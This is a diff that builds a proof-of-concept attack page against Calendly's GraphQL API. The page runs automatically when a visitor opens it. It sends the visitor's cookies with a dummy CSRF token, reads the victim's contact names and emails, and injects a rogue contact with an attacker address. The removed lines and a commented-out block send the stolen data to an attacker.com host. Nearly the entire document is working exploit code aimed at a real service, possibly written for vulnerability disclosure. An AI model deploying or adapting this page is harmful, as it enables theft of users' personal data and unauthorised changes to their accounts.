@@ -1,13 +1,99 @@
-<script>// Attacker's page - runs in victim's browser
-fetch("https://calendly.com/api/oap-api/graphql", {
-  method: "POST",
-  credentials: "include", // sends victim's cookies
-  headers: {
-    "Content-Type": "application/json",
-    "x-csrf-token": "anything" // bypassed
-  },
-  body: JSON.stringify({...})
-}).then(r => r.json()).then(data => {
-  // send data to attacker server
-  fetch("https://attacker.com/steal?d=" + btoa(JSON.stringify(data)))
-})</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Calendly CSRF PoC</title>
+</head>
+<body>
+  <h2>Calendly CSRF - Contact Data Exfiltration PoC</h2>
+  <p>Status: <span id="status">Waiting...</span></p>
+  <pre id="output"></pre>
+
+  <script>
+    const STATUS = document.getElementById("status");
+    const OUTPUT = document.getElementById("output");
+
+    async function attack() {
+      STATUS.textContent = "Sending request...";
+
+      try {
+        // Step 1: Read victim's contacts (no valid CSRF token needed)
+        const readRes = await fetch("https://calendly.com/api/oap-api/graphql", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json",
+            "x-csrf-token": "invalid_token" // bypassed - any value works
+          },
+          body: JSON.stringify({
+            operationName: "GetContacts",
+            variables: { input: {} },
+            query: `query GetContacts($input: ContactsInput!) {
+              contacts(input: $input) {
+                edges {
+                  node {
+                    id
+                    fullName
+                    email
+                  }
+                }
+              }
+            }`
+          })
+        });
+
+        const data = await readRes.json();
+        const contacts = data?.data?.contacts?.edges;
+
+        STATUS.textContent = "Contacts stolen: " + contacts.length;
+        OUTPUT.textContent = JSON.stringify(contacts, null, 2);
+
+        // Step 2: Exfiltrate to attacker server
+        // In a real attack, replace with attacker-controlled URL
+        /*
+        await fetch("https://attacker.com/collect", {
+          method: "POST",
+          body: JSON.stringify(contacts)
+        });
+        */
+
+        // Step 3 (bonus): Create a rogue contact in victim's account
+        await fetch("https://calendly.com/api/oap-api/graphql", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json",
+            "x-csrf-token": "invalid_token"
+          },
+          body: JSON.stringify({
+            operationName: "CreateContact",
+            variables: {
+              input: {
+                emails: ["attacker@evil.com"],
+                fullName: "CSRF_POC",
+                source: "canonical"
+              }
+            },
+            query: `mutation CreateContact($input: ContactInput!) {
+              createContact(input: $input) {
+                id
+                fullName
+                emails
+                __typename
+              }
+            }`
+          })
+        });
+
+        STATUS.textContent += " | Rogue contact injected ✓";
+
+      } catch (err) {
+        STATUS.textContent = "Error: " + err.message;
+        OUTPUT.textContent = err.toString();
+      }
+    }
+
+    // Auto-runs when victim visits the page
+    attack();
+  </script>
+</body>
+</html>
